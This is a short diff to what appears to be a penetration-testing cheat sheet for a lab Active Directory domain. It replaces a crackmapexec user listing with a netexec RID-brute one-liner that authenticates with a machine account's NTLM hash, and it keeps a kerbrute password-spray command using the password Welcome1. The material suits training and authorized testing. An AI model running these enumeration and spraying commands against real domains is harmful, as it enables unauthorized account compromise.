@@ -1292,11 +1292,9 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclas
 
 # Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
 
-# Create a list of user first:
-crackmapexec smb 172.16.7.50 -u ad.account -p password --users > ad_users_list.txt
-
-# parse it:
-$cat ad_users_list.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt
+# Create a list of user first faster and one liner:
+netexec smb 172.16.8.3 -u 'SRV01$' -H asdasdasdasdasdsae6 --rid-brute | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt
+grep -v '$$' users.txt >> ad-users.txt
 
 #Password Spray a list of users with a common password.
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
